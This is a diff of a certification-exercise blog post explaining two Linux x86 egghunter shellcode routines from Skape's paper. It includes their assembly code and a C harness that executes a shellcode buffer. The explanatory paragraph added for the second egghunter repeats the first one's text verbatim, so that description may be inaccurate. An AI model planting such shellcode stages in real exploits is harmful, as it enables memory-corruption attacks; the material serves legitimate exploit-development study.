@@ -25,8 +25,7 @@
 <br>
 <br>
 <h2> What is an EggHunter?</h2><br>
-<br>
-It is a very efficient exploitation method when we have little space to store our shellcode which can be seen as a <a href="https://en.wikipedia.org/wiki/Shellcode#Staged">https://en.wikipedia.org/wiki/Shellcode#Staged</a>.<br>
+It is a very efficient exploitation method when we have little space to store our shellcode which can be seen as a <a href="https://en.wikipedia.org/wiki/Shellcode#Staged">staged shellcode</a>.<br>
 <br>
 Summing up, the first part of shellcode will be responsible for searching our 4-byte tag or "egg" in memory and the second part will be stored in some position of the memory, composed of the "egg" and the shellcode to execute (which can be the typical shellcode to spawn a shell, to open a reverse shell...).<br>
 <br>
@@ -42,7 +41,9 @@ The two egghunters studied use the same syscall: access.<br>
 <br>
 <br>
 <h3> Egghunter 1</h3>
-<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">global _start<br>
+<br>
+From the code in page 8 it is possible to extract the first egghunter, with a size of 39 bytes and an estimated speed in the paper of 8 seconds:
+<br><br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">global _start<br>
 <br>
 section .text<br>
 _start:<br>
@@ -69,13 +70,17 @@ cmp dword [edx+4], ebx<br>
 jnz short jump2<br>
 jmp edx<br>
 </code><br>
-It is tested with the execve shellcode as payload:<br>
+This code uses a "page size" of 4096 bytes (0x0fff + 0x0001 = 0x1000 or 4096) which is set in EDX register, EBX register contains the address to validate (current address of EDX plus 4) and EAX contains the value needed for the access system call (0x21). After the system call, EAX is compared with 0xf2 (which represents EFAULT), if the comparison is not met the address value is checked agaisnt the "egg" value twice, contained in EBX register (given the registers value is stored before the system call and restored before checking the address against the "egg" using *pusha* and *popa*).
+<br>
+Finally, it is tested with the "execve" shellcode as payload:<br>
 <br>
 <img src="visual/images/slae/3/2.png"><br>
 <br>
 <br>
 <h3> Egghunter 2</h3>
-<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">global _start<br>
+<br>
+From the code in page 11 it is possible to extract the second egghunter, with a size of 35 bytes (so it is smaller than the previous one) and an estimated speed in the paper of 7,5 seconds (so it is faster):
+<br><br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">global _start<br>
 <br>
 section .text<br>
 _start:<br>
@@ -103,13 +108,15 @@ jnz test2<br>
 jmp edi<br>
 
 </code><br>
-It is tested with the execve shellcode as payload:<br>
+This code uses a "page size" of 4096 bytes (0x0fff + 0x0001 = 0x1000 or 4096) which is set in EDX register, EBX register contains the address to validate (current address of EDX plus 4) and EAX contains the value needed for the access system call (0x21). After the system call, EAX is compared with 0xf2 (which represents EFAULT), if the comparison is not met the address value is checked agaisnt the "egg" value twice, contained in EBX register (given the registers value is stored before the system call and restored before checking the address against the "egg" using *pusha* and *popa*).
+<br>
+Finally, it is tested with the "execve" shellcode as payload:<br>
 <br>
 <img src="visual/images/slae/3/3.png"><br>
-<br>
-<h3> PoC code</h3><br>
+<br><br>
+<h3> PoC code</h3>
 This is the code of <i>shellcode.c</i> for this exercise:
-<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">
+<br><br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">
 #include <stdio.h><br>
 #include <string.h><br>
 #define egg "x90x50x90x50"<br>
@@ -127,16 +134,15 @@ int (*ret)() = (int(*)())egghunter;<br>
 ret();<br>
 }<br>
 </code>
-<br>
+<br><br>
 <h2> Useful links </h2><br>
-<br>
-- Paper: <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf</a><br>
+- Skape's paper: <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf</a><br>
 <br>
 - Python PoC con Kolibri: <a href="https://medium.com/@rafaveira3/exploit-development-kolibri-v2-0-http-server-egg-hunter-example-1-5e435aa84879">https://medium.com/@rafaveira3/exploit-development-kolibri-v2-0-http-server-egg-hunter-example-1-5e435aa84879</a>
 <br>
 <br>
-<h2> Note</h2><br>
 <br>
+<h2> Note</h2><br>
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a><br>
 <br>
 Student ID: SLAE - 1433<br>
